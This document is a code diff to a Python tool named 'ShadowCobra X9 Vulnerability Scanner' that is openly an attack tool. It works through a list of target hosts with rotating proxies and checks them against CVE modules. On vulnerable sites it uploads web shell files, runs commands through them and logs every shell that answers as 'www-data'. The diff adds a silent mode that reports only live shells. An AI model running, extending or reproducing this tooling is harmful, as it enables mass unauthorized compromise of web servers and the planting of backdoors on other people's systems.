@@ -2,9 +2,9 @@
 # -*- coding: utf-8 -*-
 #
 # ShadowCobra X9 Vulnerability Scanner
-# Hybrid Edition by ShadowHax 🐍
+# Enhanced Edition by ShadowHax 🐍
 #
-# Combines CVE scanning and live shell detection
+# Advanced CVE scanning with auto shell upload and dashboard
 
 import requests
 import re
@@ -45,7 +45,7 @@ TIMEOUT = 10
 live_shells = []
 dashboard_lock = threading.Lock()
 
-# CVE Modules (from CobraX9++)
+# CVE Modules
 CVE_MODULES = [
     {
         "CVE": "CVE-2025-26892",
@@ -89,13 +89,14 @@ def load_proxies(file_path):
 
 # Banner
 def banner():
-    print(colored(r"""
+    banner_text = """
 ╦═╗┬ ┬┌─┐┌─┐┬ ┬┬ ┬┬┌┬┐┌─┐┬─┐
 ╠╦╝│ ││  ├┤ ├─┤│ ││ │ ├┤ ├┬┘
 ╩╚═┴─┴└─┘└─┘┴ ┴└─┘┴ ┴ └─┘┴└─
    ShadowCobra X9 Vulnerability Scanner
-        Hybrid Edition by ShadowHax (2025)
-""", "cyan"))
+        Enhanced Edition by ShadowHax (2025)
+"""
+    print(f"{Fore.CYAN}{banner_text}{Style.RESET_ALL}")
 
 # Load targets
 def load_targets(file_path):
@@ -115,7 +116,7 @@ def fetch_url(url, proxy=None):
         r = session.get(url, headers=get_random_headers(), timeout=TIMEOUT)
         if r.status_code == 200:
             return r.text
-    except Exception:
+    except requests.RequestException:
         pass
     return None
 
@@ -156,7 +157,7 @@ def exploit_upload(url, module, proxy=None):
             res = session.get(check_url, timeout=TIMEOUT)
             if "VULNTEST" in res.text:
                 return True, f"{module['CVE']} ({module['Name']})"
-    except Exception:
+    except requests.RequestException:
         pass
     return False, "Exploit failed"
 
@@ -177,7 +178,8 @@ def check_shell(base_url, shell_base, proxy=None, cmd="whoami"):
                     verify_r = session.get(verify_url, timeout=TIMEOUT, allow_redirects=True)
                     if "www-data" in verify_r.text.lower():
                         with dashboard_lock:
-                            live_shells.append(verify_url)
+                            if verify_url not in live_shells:  # Avoid duplicates
+                                live_shells.append(verify_url)
                         print(f"{Fore.RED}[!!!] LIVE SHELL (Verified www-data): {verify_url}{Style.RESET_ALL}")
                         with open("live_shells.txt", "a") as out:
                             out.write(verify_url + "\n")
@@ -190,7 +192,7 @@ def check_shell(base_url, shell_base, proxy=None, cmd="whoami"):
                 else:
                     with open("debug_shell_hits.txt", "a") as dbg:
                         dbg.write(f"{url}\n")
-            except Exception as e:
+            except requests.RequestException as e:
                 print(f"{Fore.YELLOW}Error checking {url}: {e}{Style.RESET_ALL}")
                 continue
     return None
@@ -198,13 +200,15 @@ def check_shell(base_url, shell_base, proxy=None, cmd="whoami"):
 # Process a single target
 def process_target(target, proxy=None, silent=False, cmd="whoami", use_https=False):
     base_url = f"https://{target}" if use_https else f"http://{target}"
-    print(f"\n{Fore.BLUE}[*] Scanning {base_url}{Style.RESET_ALL}")
+    if not silent:
+        print(f"\n{Fore.BLUE}[*] Scanning {base_url}{Style.RESET_ALL}")
 
     # Check CVE modules
     for module in CVE_MODULES:
         vuln, msg = check_module(base_url, module, proxy)
         if vuln:
-            print(f"{Fore.RED}[VULNERABLE] {base_url} → {msg}{Style.RESET_ALL}")
+            if not silent:
+                print(f"{Fore.RED}[VULNERABLE] {base_url} → {msg}{Style.RESET_ALL}")
             # Attempt shell upload and check
             for shell in SHELL_FILES:
                 if os.path.exists(shell):
@@ -214,15 +218,16 @@ def process_target(target, proxy=None, silent=False, cmd="whoami", use_https=Fal
                             check_shell(base_url, shell_base, proxy, cmd)
                             break
                 else:
-                    print(f"{Fore.RED}[!] Missing shell: {shell}{Style.RESET_ALL}")
+                    if not silent:
+                        print(f"{Fore.RED}[!] Missing shell: {shell}{Style.RESET_ALL}")
                     break
-        else:
+        elif not silent:
             print(f"{Fore.GREEN}[SAFE] {base_url} → {msg}{Style.RESET_ALL}")
 
-    if not any(vuln for module in CVE_MODULES for vuln, _ in [check_module(base_url, module, proxy)]):
+    if not any(vuln for module in CVE_MODULES for vuln, _ in [check_module(base_url, module, proxy)]) and not silent:
         print(f"{Fore.YELLOW}[INFO] {base_url} → No known CVEs matched{Style.RESET_ALL}")
 
-# Upload shell (from ShadowUploader)
+# Upload shell
 def upload_shell(base_url, endpoint, shell_file, proxy=None):
     upload_url = urljoin(base_url + "/", endpoint)
     try:
@@ -234,9 +239,10 @@ def upload_shell(base_url, endpoint, shell_file, proxy=None):
                 session.proxies = {"http": proxy, "https": proxy}
             r = session.post(upload_url, files=files, timeout=TIMEOUT)
             if r.status_code in [200, 201, 302, 403]:
-                print(f"{Fore.GREEN}[+] Uploaded {shell_file} to: {upload_url}{Style.RESET_ALL}")
+                if not silent:
+                    print(f"{Fore.GREEN}[+] Uploaded {shell_file} to: {upload_url}{Style.RESET_ALL}")
                 return True
-    except Exception:
+    except requests.RequestException:
         pass
     return False
 
@@ -259,7 +265,7 @@ def update_dashboard():
 
 # Main function
 def main():
-    parser = argparse.ArgumentParser(description="ShadowCobra X9 Vulnerability Scanner - Hybrid Edition")
+    parser = argparse.ArgumentParser(description="ShadowCobra X9 Vulnerability Scanner - Enhanced Edition")
     parser.add_argument("--silent", action="store_true", help="Run in silent mode (suppress output except LIVE SHELL)")
     parser.add_argument("--cmd", default="whoami", help="Command to execute via shell (default: whoami)")
     parser.add_argument("--https", action="store_true", help="Force HTTPS requests")
@@ -269,6 +275,10 @@ def main():
     targets = load_targets(TARGETS_FILE)
     proxies = load_proxies(PROXY_FILE)
 
+    if not targets:
+        print(f"{Fore.RED}[!] No targets found in {TARGETS_FILE}!{Style.RESET_ALL}")
+        sys.exit(1)
+
     # Start dashboard in a separate thread
     dashboard_thread = threading.Thread(target=update_dashboard, daemon=True)
     dashboard_thread.start()
@@ -276,8 +286,16 @@ def main():
     # Distribute proxies across targets if available
     proxy_cycle = (proxies * (len(targets) // len(proxies) + 1))[:len(targets)] if proxies else [None] * len(targets)
 
+    # Global silent flag for upload_shell
+    global silent
+    silent = args.silent
+
     with ThreadPoolExecutor(max_workers=THREADS) as executor:
         list(tqdm(executor.map(lambda x, p: process_target(x, p, args.silent, args.cmd, args.https), targets, proxy_cycle), total=len(targets), disable=args.silent))
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(f"\n{Fore.YELLOW}Scan stopped by user{Style.RESET_ALL}")
+        sys.exit(0)
